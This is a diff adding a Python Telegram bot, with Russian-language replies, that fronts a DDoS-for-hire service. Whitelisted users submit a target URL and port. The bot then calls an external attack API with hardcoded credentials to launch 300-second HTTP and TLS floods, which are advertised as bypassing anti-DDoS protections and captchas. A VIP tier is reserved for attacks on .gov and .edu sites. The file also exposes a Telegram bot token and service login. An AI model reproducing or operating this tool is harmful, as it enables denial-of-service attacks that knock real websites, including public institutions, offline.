@@ -1,0 +1,411 @@
+import telebot
+from telebot import types
+import requests
+import json
+import time
+
+bot = telebot.TeleBot('6741912562:AAF_v9mCh5vrHuWrL8B6cC0zfd4CVPMsxiA')
+
+def check_user(user_id):
+    with open('users.txt', 'r') as file:
+        users = file.read().splitlines()  # Список строк, с ID пользователей
+    return str(user_id) in users
+def check_vip_user(user_id):
+    with open('users_vip.txt', 'r') as file:
+        users = file.read().splitlines()  # Список строк, с ID пользователей
+    return str(user_id) in users
+
+@bot.message_handler(commands=['start'])
+def handle_start(message):
+    if not check_user(message.chat.id):
+        bot.reply_to(message, 'Нет доступа')
+        return
+
+    with open('killnet.png', 'rb') as killnet:
+        bot.send_photo(message.chat.id, killnet)
+
+
+    bot.reply_to(message, 'Список методов:\nhttp - HTTP/1 флуд с высоким числом запросов в секунду\ntls - HTTP/2-флуд с использованием метода TLS\nextreme - HTTP/2 флуд, оптимизированный для обхода\ntlsbypass - HTTP/MIX обходит флуд с помощью TLS-пакетов\nexplosion - HTTP/MIX-флуд, оптимизированный для High Bypass\nprotocol - по протоколу HTTP/2, оптимизированный для обхода Under-Attack Mode\ngenius - HTTP/2 флуд с эмуляцией браузера\ngovhttp - HTTP/2-флуд, оптимизированный для обхода\ngovbrowser - Эмуляция браузера .gov .edu .\ngovcap - captcha .gov .edu .')
+    with open('image.png', 'rb') as photo:
+        bot.send_photo(message.chat.id, photo)
+
+
+@bot.message_handler(commands=['http', 'tls', 'extreme', 'protocol', 'genius', 'method', 'tlsbypass', 'explosion', 'govhttp', 'GOVbhtsx', 'govbrowser', 'govcap'])
+def handle_command(message):
+    if not check_user(message.chat.id):
+        bot.reply_to(message, 'Нет доступа')
+        return
+    command = message.text.split(' ')
+    if '.ru' in message.text:
+        bot.reply_to(message, 'Цель в черном списке')
+    else:
+        # Проверяем, что команда имеет правильный формат
+        if len(command) >= 3:
+            command_type = command[0][1:]
+            url = command[1]
+            port = command[2]
+
+
+
+
+
+            if command_type == 'http':
+                url = f'https://in.krypton.limited/api/attack?username=bluenet&password=paporotny123&target={url}&port={port}&time=300&method=http'  # Замените на нужный URL
+                print(url)            # Замените на нужный URL
+                response = requests.get(url)
+                print(response.text)
+
+
+    # Проверяем статус-код ответа
+
+                if response.status_code == 200:
+                    if '"error":false' in response.text:
+                        bot.reply_to(message, 'Запрос выполнен успешно')
+
+
+                    else:
+                        if "Address is already under attack" in response.text:
+                            bot.reply_to(message, 'Адрес уже атакуется')
+                        elif "Network is overloaded, please wait or try again." in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "The target is blacklisted" in response.text:
+                            bot.reply_to(message, 'Цель в черном списке')
+                        elif "Limit of concurrents attacks by this method reached" in response.text:
+                            bot.reply_to(message, 'Достигнуто ограничение одновременных атак этим методом')
+                        elif "Try again in a few seconds" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "Method isn't exist or temporary disabled" in response.text:
+                            bot.reply_to(message, "Метод не существует или временно отключен")
+                        elif "Method is already used" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "VIP" in response.text:
+                            bot.reply_to(message, 'Используйте методы для атак .gov/.edu')
+
+                pass
+            elif command_type == 'tls':
+                url = f'https://in.krypton.limited/api/attack?username=bluenet&password=paporotny123&target={url}&port={port}&time=300&method=tls'  # Замените на нужный URL
+                print(url)            # Замените на нужный URL
+                response = requests.get(url)
+                print(response.text)
+
+
+    # Проверяем статус-код ответа
+                if response.status_code == 200:
+                    if '"error":false' in response.text:
+                        bot.reply_to(message, 'Запрос выполнен успешно')
+
+                    else:
+                        if "Address is already under attack" in response.text:
+                            bot.reply_to(message, 'Адрес уже атакуется')
+                        elif "Network is overloaded, please wait or try again." in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "The target is blacklisted" in response.text:
+                            bot.reply_to(message, 'Цель в черном списке')
+                        elif "Limit of concurrents attacks by this method reached" in response.text:
+                            bot.reply_to(message, 'Достигнуто ограничение одновременных атак этим методом')
+                        elif "Try again in a few seconds" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "Method isn't exist or temporary disabled" in response.text:
+                            bot.reply_to(message, "Метод не существует или временно отключен")
+                        elif "Method is already used" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "VIP" in response.text:
+                            bot.reply_to(message, 'Используйте методы для атак .gov/.edu')
+                pass
+            elif command_type == 'extreme':
+                url = f'https://in.krypton.limited/api/attack?username=bluenet&password=paporotny123&target={url}&port={port}&time=300&method=extreme'
+                print(url)            # Замените на нужный URL
+                response = requests.get(url)
+                print(response.text)
+
+
+    # Проверяем статус-код ответа
+                if response.status_code == 200:
+                    if '"error":false' in response.text:
+                        bot.reply_to(message, 'Запрос выполнен успешно')
+
+                    else:
+                        if "Address is already under attack" in response.text:
+                            bot.reply_to(message, 'Адрес уже атакуется')
+                        elif "Network is overloaded, please wait or try again." in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "The target is blacklisted" in response.text:
+                            bot.reply_to(message, 'Цель в черном списке')
+                        elif "Limit of concurrents attacks by this method reached" in response.text:
+                            bot.reply_to(message, 'Достигнуто ограничение одновременных атак этим методом')
+                        elif "Try again in a few seconds" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "Method isn't exist or temporary disabled" in response.text:
+                            bot.reply_to(message, "Метод не существует или временно отключен")
+                        elif "Method is already used" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "VIP" in response.text:
+                            bot.reply_to(message, 'Используйте методы для атак .gov/.edu')
+                pass
+            elif command_type == 'protocol':
+                url = f'https://in.krypton.limited/api/attack?username=bluenet&password=paporotny123&target={url}&port={port}&time=300&method=protocol'  # Замените на нужный URL
+                print(url)            # Замените на нужный URL
+                response = requests.get(url)
+                print(response.text)
+
+
+    # Проверяем статус-код ответа
+                if response.status_code == 200:
+                    if '"error":false' in response.text:
+                        bot.reply_to(message, 'Запрос выполнен успешно')
+
+                    else:
+                        if "Address is already under attack" in response.text:
+                            bot.reply_to(message, 'Адрес уже атакуется')
+                        elif "Network is overloaded, please wait or try again." in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "The target is blacklisted" in response.text:
+                            bot.reply_to(message, 'Цель в черном списке')
+                        elif "Limit of concurrents attacks by this method reached" in response.text:
+                            bot.reply_to(message, 'Достигнуто ограничение одновременных атак этим методом')
+                        elif "Try again in a few seconds" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "Method isn't exist or temporary disabled" in response.text:
+                            bot.reply_to(message, "Метод не существует или временно отключен")
+                        elif "Method is already used" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "VIP" in response.text:
+                            bot.reply_to(message, 'Используйте методы для атак .gov/.edu')
+                pass
+            elif command_type == 'genius':
+                url = f'https://in.krypton.limited/api/attack?username=bluenet&password=paporotny123&target={url}&port={port}&time=300&method=genius'  # Замените на нужный URL
+                print(url)            # Замените на нужный URL
+                response = requests.get(url)
+                print(response.text)
+
+
+
+
+    # Проверяем статус-код ответа
+                if response.status_code == 200:
+                    if '"error":false' in response.text:
+                        bot.reply_to(message, 'Запрос выполнен успешно')
+
+
+
+                    else:
+                        if "Address is already under attack" in response.text:
+                            bot.reply_to(message, 'Адрес уже атакуется')
+                        elif "Network is overloaded, please wait or try again." in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "The target is blacklisted" in response.text:
+                            bot.reply_to(message, 'Цель в черном списке')
+                        elif "Limit of concurrents attacks by this method reached" in response.text:
+                            bot.reply_to(message, 'Достигнуто ограничение одновременных атак этим методом')
+                        elif "Try again in a few seconds" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "Method isn't exist or temporary disabled" in response.text:
+                            bot.reply_to(message, "Метод не существует или временно отключен")
+                        elif "Method is already used" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "VIP" in response.text:
+                            bot.reply_to(message, 'Используйте методы для атак .gov/.edu')
+                pass
+
+
+            elif command_type == 'tlsbypass':
+                url = f'https://in.krypton.limited/api/attack?username=bluenet&password=paporotny123&target={url}&port={port}&time=300&method=tlsbypass'  # Замените на нужный URL
+                print(url)            # Замените на нужный URL
+                response = requests.get(url)
+                print(response.text)
+
+
+    # Проверяем статус-код ответа
+                if response.status_code == 200:
+                    if '"error":false' in response.text:
+                        bot.reply_to(message, 'Запрос выполнен успешно')
+
+                    else:
+                        if "Address is already under attack" in response.text:
+                            bot.reply_to(message, 'Адрес уже атакуется')
+                        elif "Network is overloaded, please wait or try again." in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "The target is blacklisted" in response.text:
+                            bot.reply_to(message, 'Цель в черном списке')
+                        elif "Limit of concurrents attacks by this method reached" in response.text:
+                            bot.reply_to(message, 'Достигнуто ограничение одновременных атак этим методом')
+                        elif "Try again in a few seconds" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "Method isn't exist or temporary disabled" in response.text:
+                            bot.reply_to(message, "Метод не существует или временно отключен")
+                        elif "Method is already used" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "VIP" in response.text:
+                            bot.reply_to(message, 'Используйте методы для атак .gov/.edu')
+                pass
+            elif command_type == 'explosion':
+                url = f'https://in.krypton.limited/api/attack?username=bluenet&password=paporotny123&target={url}&port={port}&time=300&method=explosion'  # Замените на нужный URL
+                print(url)            # Замените на нужный URL
+                response = requests.get(url)
+                print(response.text)
+
+
+    # Проверяем статус-код ответа
+                if response.status_code == 200:
+                    if '"error":false' in response.text:
+                        bot.reply_to(message, 'Запрос выполнен успешно')
+
+                    else:
+                        if "Address is already under attack" in response.text:
+                            bot.reply_to(message, 'Адрес уже атакуется')
+                        elif "Network is overloaded, please wait or try again." in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "The target is blacklisted" in response.text:
+                            bot.reply_to(message, 'Цель в черном списке')
+                        elif "Limit of concurrents attacks by this method reached" in response.text:
+                            bot.reply_to(message, 'Достигнуто ограничение одновременных атак этим методом')
+                        elif "Try again in a few seconds" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "Method isn't exist or temporary disabled" in response.text:
+                            bot.reply_to(message, "Метод не существует или временно отключен")
+                        elif "Method is already used" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "VIP" in response.text:
+                            bot.reply_to(message, 'Используйте методы для атак .gov/.edu')
+                pass
+
+            elif command_type == 'govhttp':
+                if not check_vip_user(message.chat.id):
+                    bot.reply_to(message, 'Нет доступа')
+                    return
+                url = f'https://in.krypton.limited/api/attack?username=bluenet&password=paporotny123&target={url}&port={port}&time=300&method=htsx'  # Замените на нужный URL
+                print(url)            # Замените на нужный URL
+                response = requests.get(url)
+                print(response.text)
+
+
+    # Проверяем статус-код ответа
+                if response.status_code == 200:
+                    if '"error":false' in response.text:
+                        bot.reply_to(message, 'Запрос выполнен успешно')
+
+
+                    else:
+                        if "Address is already under attack" in response.text:
+                            bot.reply_to(message, 'Адрес уже атакуется')
+                        elif "Network is overloaded, please wait or try again." in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "The target is blacklisted" in response.text:
+                            bot.reply_to(message, 'Цель в черном списке')
+                        elif "Limit of concurrents attacks by this method reached" in response.text:
+                            bot.reply_to(message, 'Достигнуто ограничение одновременных атак этим методом')
+                        elif "Try again in a few seconds" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "Method isn't exist or temporary disabled" in response.text:
+                            bot.reply_to(message, "Метод не существует или временно отключен")
+                        elif "Method is already used" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "VIP" in response.text:
+                            bot.reply_to(message, 'Используйте методы для атак .gov/.edu')
+                pass
+            elif command_type == 'govbrowser':
+                if not check_vip_user(message.chat.id):
+                    bot.reply_to(message, 'Нет доступа')
+                    return
+                url = f'https://in.krypton.limited/api/attack?username=bluenet&password=paporotny123&target={url}&port={port}&time=300&method=bhtsx'  # Замените на нужный URL
+                print(url)            # Замените на нужный URL
+                response = requests.get(url)
+                print(response.text)
+
+
+    # Проверяем статус-код ответа
+                if response.status_code == 200:
+                    if '"error":false' in response.text:
+                        bot.reply_to(message, 'Запрос выполнен успешно')
+
+                    else:
+                        if "Address is already under attack" in response.text:
+                            bot.reply_to(message, 'Адрес уже атакуется')
+                        elif "Network is overloaded, please wait or try again." in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "The target is blacklisted" in response.text:
+                            bot.reply_to(message, 'Цель в черном списке')
+                        elif "Limit of concurrents attacks by this method reached" in response.text:
+                            bot.reply_to(message, 'Достигнуто ограничение одновременных атак этим методом')
+                        elif "Try again in a few seconds" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "Method isn't exist or temporary disabled" in response.text:
+                            bot.reply_to(message, "Метод не существует или временно отключен")
+                        elif "Method is already used" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "VIP" in response.text:
+                            bot.reply_to(message, 'Используйте методы для атак .gov/.edu')
+                pass
+            elif command_type == 'govcap':
+                if not check_vip_user(message.chat.id):
+                    bot.reply_to(message, 'Нет доступа')
+                    return
+                url = f'https://in.krypton.limited/api/attack?username=bluenet&password=paporotny123&target={url}&port={port}&time=300&method=tlsx'  # Замените на нужный URL
+                print(url)            # Замените на нужный URL
+                response = requests.get(url)
+                print(response.text)
+
+
+    # Проверяем статус-код ответа
+                if response.status_code == 200:
+                    if '"error":false' in response.text:
+                        bot.reply_to(message, 'Запрос выполнен успешно')
+
+                    else:
+                        if "Address is already under attack" in response.text:
+                            bot.reply_to(message, 'Адрес уже атакуется')
+                        elif "Network is overloaded, please wait or try again." in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "The target is blacklisted" in response.text:
+                            bot.reply_to(message, 'Цель в черном списке')
+                        elif "Limit of concurrents attacks by this method reached" in response.text:
+                            bot.reply_to(message, 'Достигнуто ограничение одновременных атак этим методом')
+                        elif "Try again in a few seconds" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "Method isn't exist or temporary disabled" in response.text:
+                            bot.reply_to(message, "Метод не существует или временно отключен")
+                        elif "Method is already used" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "VIP" in response.text:
+                            bot.reply_to(message, 'Используйте методы для атак .gov/.edu')
+                pass
+            elif command_type == 'GOVcaptcha':
+                url = f'https://in.krypton.limited/api/attack?username=bluenet&password=paporotny123&target={url}&port={port}&time=300&method=captcha'  # Замените на нужный URL
+                print(url)            # Замените на нужный URL
+                response = requests.get(url)
+                print(response.text)
+
+
+    # Проверяем статус-код ответа
+                if response.status_code == 200:
+                    if '"error":false' in response.text:
+                        bot.reply_to(message, 'Запрос выполнен успешно')
+
+                    else:
+                        if "Address is already under attack" in response.text:
+                            bot.reply_to(message, 'Адрес уже атакуется')
+                        elif "Network is overloaded, please wait or try again." in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "The target is blacklisted" in response.text:
+                            bot.reply_to(message, 'Цель в черном списке')
+                        elif "Limit of concurrents attacks by this method reached" in response.text:
+                            bot.reply_to(message, 'Достигнуто ограничение одновременных атак этим методом')
+                        elif "Try again in a few seconds" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "Method isn't exist or temporary disabled" in response.text:
+                            bot.reply_to(message, "Метод не существует или временно отключен")
+                        elif "Method is already used" in response.text:
+                            bot.reply_to(message, 'Сеть перегружена, пожалуйста, подождите и попробуйте снова.')
+                        elif "VIP" in response.text:
+                            bot.reply_to(message, 'Используйте методы для атак .gov/.edu')
+                pass
+            else:
+                bot.reply_to(message, 'Неизвестная команда')
+        else:
+            bot.reply_to(message, 'Неправильный формат команды.\n\nФормат команды:')
+            with open('image.png', 'rb') as photo:
+                   bot.send_photo(message.chat.id, photo)
+
+
+# Запускаем бота
+bot.polling()
